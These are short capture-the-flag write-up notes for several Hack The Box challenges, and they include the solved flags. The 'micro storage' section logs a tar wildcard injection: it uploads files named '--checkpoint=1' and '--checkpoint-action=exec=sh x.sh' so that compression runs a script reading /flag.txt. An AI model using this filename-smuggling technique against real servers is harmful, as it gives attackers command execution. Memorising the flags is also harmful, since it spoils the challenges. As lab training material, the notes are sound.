# compressor

i know there is acommand injection vulnerability but where.

# canvas

javascript deobfuscation was what we needed to do

HTB{W3Lc0m3_70_J4V45CR1p7_d30bFu5C4710N}

# micro storage
```
>> Choose an option: 1
[*] Enter your file name: --checkpoint=1
[*] Start typing your file content: (send 'EOF' when done)
firstFile EOF
[+] Your file "--checkpoint=1" has been saved. (10 bytes written)
1 => Upload a new file (9 file(s) remaining)             
2 => List your uploaded files (1 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: --checkpoint-action=exec=sh x.sh
[-] No such option.
1 => Upload a new file (9 file(s) remaining)             
2 => List your uploaded files (1 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 1
[*] Enter your file name: --checkpoint-action=exec=sh x.sh
[*] Start typing your file content: (send 'EOF' when done)
secondFile EOF
[+] Your file "--checkpoint-action=exec=sh x.sh" has been saved. (11 bytes written)
1 => Upload a new file (8 file(s) remaining)             
2 => List your uploaded files (2 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: x.sh
[-] No such option.
1 => Upload a new file (8 file(s) remaining)             
2 => List your uploaded files (2 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 1
[*] Enter your file name: x.sh
[*] Start typing your file content: (send 'EOF' when done)
#!/bin/bash
value=`cat /flag.txt`
echo "$value"EOF
[+] Your file "x.sh" has been saved. (47 bytes written)
1 => Upload a new file (7 file(s) remaining)             
2 => List your uploaded files (3 file(s) uploaded so far)
3 => Delete a file                                        
4 => Print file content                                   
5 => Compress and download all your files                 
0 => Quit (you will lose your files!)                     
>>> Choose an option: 5
HTB{@bus1Ng_gTf0_b1N$_c4n_b3_fUn_s0m3t1meS__r1g|-|t??!!__c4fdecf8}
[+] Your base64 encoded archive:
eC5zaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAwMDA2NDQAMDAwMTc1MAAwMDAxNzUwADAwMDAwMDAwMDU3ADE0MjU1NTA3NDU3ADAxMTU3MwAgMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

# misdirection

```
Archive:  misDIRection.zip
[misDIRection.zip] .secret/S/1 password: 
replace .secret/S/1? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
 extracting: .secret/S/1             
replace .secret/V/35? [y]es, [n]o, [A]ll, [N]one, [r]ename: a
error:  invalid response [a]
replace .secret/V/35? [y]es, [n]o, [A]ll, [N]one, [r]ename: A
 extracting: .secret/V/35            
 extracting: .secret/F/2             
 extracting: .secret/F/19            
 extracting: .secret/F/27            
 extracting: .secret/B/23            
 extracting: .secret/2/34            
 extracting: .secret/R/7             
 extracting: .secret/R/3             
 extracting: .secret/z/18            
 extracting: .secret/j/10            
 extracting: .secret/j/12            
 extracting: .secret/d/13            
 extracting: .secret/U/9             
 extracting: .secret/p/32            
 extracting: .secret/N/25            
 extracting: .secret/N/11            
 extracting: .secret/N/31            
 extracting: .secret/N/33            
 extracting: .secret/e/5             
 extracting: .secret/1/30            
 extracting: .secret/1/22            
 extracting: .secret/s/24            
 extracting: .secret/D/26            
 extracting: .secret/X/29            
 extracting: .secret/X/21            
 extracting: .secret/X/17            
 extracting: .secret/9/36            
 extracting: .secret/J/8             
 extracting: .secret/C/4             
 extracting: .secret/0/6             
 extracting: .secret/E/14            
 extracting: .secret/5/16            
 extracting: .secret/x/15            
 extracting: .secret/u/20            
 extracting: .secret/u/28 
```

looking at all the directories

```
#!/usr/bin/python

import os

# traverse root directory, and list directories as dirs and files as files
for root, dirs, files in os.walk("."):
    path = root.split(os.sep)
    print((len(path) - 1) * '---', os.path.basename(root))
    for file in files:
        print(len(path) * '---', file)
```

looking at the empty directories

```
┌──(kali㉿kali)-[~/Downloads]
└─$ find  . -type d -empty -print
./.secret/7
./.secret/8
./.secret/H
./.secret/b
./.secret/6
./.secret/M
./.secret/O
./.secret/r
./.secret/y
./.secret/o
./.secret/v
./.secret/a
./.secret/q
./.secret/t
./.secret/w
./.secret/c
./.secret/K
./.secret/h
./.secret/g
./.secret/3
./.secret/G
./.secret/T
./.secret/k
./.secret/m
./.secret/Q
./.secret/P
./.secret/4
./.secret/L
./.secret/W
./.secret/i
./.secret/I
./.secret/n
./.secret/Y
./.secret/A
./.secret/l
./.secret/Z
./.secret/f

```

deleting ll the mbty directories

```
find  . -type d -empty -delete

```

we find that each directory has  number so sorting the directory by the number 

```
#!/usr/bin/python

import os


main_files = {}
# traverse root directory, and list directories as dirs and files as files
for root, dirs, files in os.walk("."):
    path = root.split(os.sep)
    print((len(path) - 1) * '---', os.path.basename(root))
    for file in files:
        print(len(path) * '---', file)
        main_files[file] = str(path [-1])

final = ""
for i in sorted(main_files):
    final += main_files[i]

print(final)
```

output 

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python dir_traverse.py
 .
--- misDIRection.zip
--- dir_traverse.py
--- .secret
------ d
--------- 13
------ J
--------- 8
------ E
--------- 14
------ z
--------- 18
------ 0
--------- 6
------ D
--------- 26
------ j
--------- 10
--------- 12
------ V
--------- 35
------ 5
--------- 16
------ U
--------- 9
------ p
--------- 32
------ F
--------- 19
--------- 27
--------- 2
------ C
--------- 4
------ S
--------- 1
------ s
--------- 24
------ R
--------- 7
--------- 3
------ 9
--------- 36
------ x
--------- 15
------ 2
--------- 34
------ N
--------- 11
--------- 31
--------- 25
--------- 33
------ 1
--------- 30
--------- 22
------ X
--------- 29
--------- 17
--------- 21
------ e
--------- 5
------ B
--------- 23
------ u
--------- 20
--------- 28
SjNjdEx5XzFFuX1BsNDFuXR1NpN2V9Ce0RJU..
SFRCe0RJUjNjdEx5XzFuX1BsNDFuX1NpN2V9
```

HTB{DIR3ctLy_1n_Pl41n_Si7e}

# Eternal loop

create  program to extract till its possible.